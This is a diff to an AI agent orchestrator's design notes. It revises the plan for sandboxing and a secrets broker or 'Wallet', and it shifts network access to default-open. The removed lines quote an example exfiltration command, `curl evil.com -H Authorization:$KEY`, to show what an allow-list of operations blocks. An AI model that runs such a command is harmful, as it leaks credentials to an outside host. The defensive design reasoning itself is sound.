@@ -148,18 +148,24 @@ module-locality from the touched-file set to decide what can parallelize.
   github.com/aadegtyarev/claude-orchestrator (bwrap sandbox seeing only the work
   dir + own home, ~/.ssh and neighbors cut off; a host-side `vault` daemon that
   keeps secrets on the host and runs git/gh/curl with creds injected, the session
-  seeing only a marker). ad-coder version, better-fit to our idioms: (1) both are
-  OPTIONAL INJECTED SEAMS — `Sandbox` (bwrap = Linux impl; microVM / macOS
-  sandbox-exec / container / none = others, never a hard dep) and
-  `CredentialBroker`; (2) the broker exposes an ALLOW-LIST OF OPERATIONS
-  (gitPush(branch), ghPr, curl to allowed hosts) NOT arbitrary-command-with-cred,
-  so even through the broker no `curl evil.com -H Authorization:$KEY` — policy is
-  operation-shaped; (3) every privileged op is LEDGER-AUDITED (role/op/allow-deny),
-  the observability that makes it trustworthy; (4) composes with the runner's
-  credential boundary (half one) + broker-ops-as-tools under activeToolNames +
-  tool-usage observability. Makes allow-list ≠ sandbox concrete: allow-list =
-  economy/intent, sandbox+broker = the hard boundary. Needed before unsupervised
-  runs on an untrusted task.
+  seeing only a marker). ad-coder version, fitted to our DEFAULT-OPEN philosophy: (1) both are
+  OPTIONAL INJECTED SEAMS — `Sandbox` (bwrap = Linux; microVM / macOS sandbox-exec
+  / container / none behind the seam, never a hard dep) and a `Wallet`; (2) NETWORK
+  IS DEFAULT-OPEN — an autonomous research/design agent reaches anywhere; an
+  egress/host allow-list is OPT-IN only for hardened runs (NOT a default — pre-
+  declaring hosts is the same enumerate-everything-is-fragile trap as the tool
+  allow-list); (3) the WALLET is the single conscious secret-orchestration point
+  with two modes — BROKER (runs git/gh on the host with the cred, returns the
+  result, agent sees only a marker) and INJECT (puts CHOSEN secrets/env into the
+  sandbox for the agent to use directly): "this run gets DEEPSEEK_API_KEY and
+  GH_TOKEN, nothing else"; (4) honest residual (inject + open network = a
+  compromised agent could exfil an injected secret) is managed by scoping WHICH
+  secrets enter (prefer broker-mode for high-value creds; inject only what the run
+  needs) + LEDGER-AUDITING every privileged op and injected secret — safety from
+  conscious scoping + observation, NOT from egress limits. Composes with the
+  runner credential boundary. The sandbox turns the runner targetDir from a
+  starting cwd into a real jail. Needed before unsupervised runs on an untrusted
+  task.
 - **Prompts as files** — roles reference prompts by name from files, not only
   inline strings. Both prompts already exist (Role.systemPrompt verbatim; the task
   prompt via runRole) — the gap is storage. Resolve at the boundary (name → file →
